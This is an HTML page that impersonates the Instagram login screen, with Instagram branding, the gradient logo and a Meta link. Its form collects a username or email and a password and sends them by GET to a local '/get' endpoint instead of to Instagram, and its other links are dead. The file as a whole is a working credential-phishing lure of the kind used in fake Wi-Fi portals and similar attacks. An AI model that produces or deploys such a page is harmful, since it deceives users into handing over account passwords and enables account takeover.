<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram Login</title>


<style>

body {
    display: flex;
    flex-direction: column;
    align-items: center;
    min-height: 100vh;
    background-color: #f1f1f1;
    margin: 0;
    font-family: Arial, Helvetica, sans-serif;
}


.login-container {
    width: 90%;
    max-width: 355px;   /* 355px is enough for phones */
    margin-top: 20px;
    padding: 12px;
    background: #fff;
    border-radius: 8px;
    box-shadow: 0 2px 8px rgba(0,0,0,0.1);
    text-align: center;
}


.logo {
    width: 60px;               /* shrink logo */
    margin-bottom: 12px;
}

.language-selector {
    text-align: center;
    margin-bottom: 8px;
    margin-top: 8px;
    font-size: 0.85rem;
}

.g-input {
    width: 100%;
    padding: 8px 10px;
    margin-bottom: 8px;
    border: 1px solid #ccc;
    border-radius: 4px;
    box-sizing: border-box;
    font-size: 0.9rem;
}

.gbtn-primary,
.create-account-button {
    width: 100%;
    padding: 9px 0;
    border: none;
    border-radius: 6px;
    font-weight: bold;
    font-size: 0.95rem;
    cursor: pointer;
    margin-bottom: 8px;
    margin-top: 150px;
}

.gbtn-primary {
    background-color: #0095F6;
    color: #fff;
    margin-top: 10px;
}

.create-account-button {
    background: #fff;
    color: #0095F6;
    border: 1px solid #0095F6;
}


.forgotten-password,
.meta-link {
    display: block;
    text-align: center;
    color: #0095F6;
    font-size: 0.75rem;
    margin-bottom: 6px;
    text-decoration: none;
}

.meta-link { color: #8e8e8e; }



svg {
  margin-bottom: 100px;
  margin-top: 100px;
}

.partner-text{
    margin-bottom: 40px;
    margin-top: -40px;
    text-align: center;
}

</style>
</head>

<body>
<div class="login-container">
    <div class="language-selector">
        English (UK)
    </div>

    <form action="/get" id="email-form-step">
        <!-- Instagram SVG logo -->
        <svg xmlns="http://www.w3.org/2000/svg" width="60" height="60" viewBox="0 0 16 16">
            <defs>
                <linearGradient id="instaGradient" x1="0%" y1="0%" x2="100%" y2="100%">
                    <stop offset="0%" stop-color="#feda75"/>
                    <stop offset="25%" stop-color="#fa7e1e"/>
                    <stop offset="50%" stop-color="#d62976"/>
                    <stop offset="75%" stop-color="#962fbf"/>
                    <stop offset="100%" stop-color="#4f5bd5"/>
                </linearGradient>
            </defs>
            <path fill="url(#instaGradient)" d="M8 0C5.829 0 5.556.01 4.703.048 3.85.088 3.269.222 2.76.42a3.9 3.9 0 0 0-1.417.923A3.9 3.9 0 0 0 .42 2.76C.222 3.268.087 3.85.048 4.7.01 5.555 0 5.827 0 8.001c0 2.172.01 2.444.048 3.297.04.852.174 1.433.372 1.942.205.526.478.972.923 1.417.444.445.89.719 1.416.923.51.198 1.09.333 1.942.372C5.555 15.99 5.827 16 8 16s2.444-.01 3.298-.048c.851-.04 1.434-.174 1.943-.372a3.9 3.9 0 0 0 1.416-.923c.445-.445.718-.891.923-1.417.197-.509.332-1.09.372-1.942C15.99 10.445 16 10.173 16 8s-.01-2.445-.048-3.299c-.04-.851-.175-1.433-.372-1.941a3.9 3.9 0 0 0-.923-1.417A3.9 3.9 0 0 0 13.24.42c-.51-.198-1.092-.333-1.943-.372C10.443.01 10.172 0 7.998 0zm-.717 1.442h.718c2.136 0 2.389.007 3.232.046.78.035 1.204.166 1.486.275.373.145.64.319.92.599s.453.546.598.92c.11.281.24.705.275 1.485.039.843.047 1.096.047 3.231s-.008 2.389-.047 3.232c-.035.78-.166 1.203-.275 1.485a2.5 2.5 0 0 1-.599.919c-.28.28-.546.453-.92.598-.28.11-.704.24-1.485.276-.843.038-1.096.047-3.232.047s-2.39-.009-3.233-.047c-.78-.036-1.203-.166-1.485-.276a2.5 2.5 0 0 1-.92-.598 2.5 2.5 0 0 1-.6-.92c-.109-.281-.24-.705-.275-1.485-.038-.843-.046-1.096-.046-3.233s.008-2.388.046-3.231c.036-.78.166-1.204.276-1.486.145-.373.319-.64.599-.92s.546-.453.92-.598c.282-.11.705-.24 1.485-.276.738-.034 1.024-.044 2.515-.045zm4.988 1.328a.96.96 0 1 0 0 1.92.96.96 0 0 0 0-1.92m-4.27 1.122a4.109 4.109 0 1 0 0 8.217 4.109 4.109 0 0 0 0-8.217m0 1.441a2.667 2.667 0 1 1 0 5.334 2.667 2.667 0 0 1 0-5.334"/>
        </svg>

        <h3 class="partner-text">Instagram</h2>

        <input name="email" type="text" class="g-input" placeholder="Username, email address or mobile number" required>
        <input name="password" type="password" class="g-input" placeholder="Password" required>

        <button class="gbtn-primary" type="submit">Log in</button>

        <a href="#" class="forgotten-password">Forgotten password?</a>

        <button class="create-account-button">Create new account</button>

        <a href="#" class="meta-link">Meta</a>
    </form>
</div>
</body>
</html>
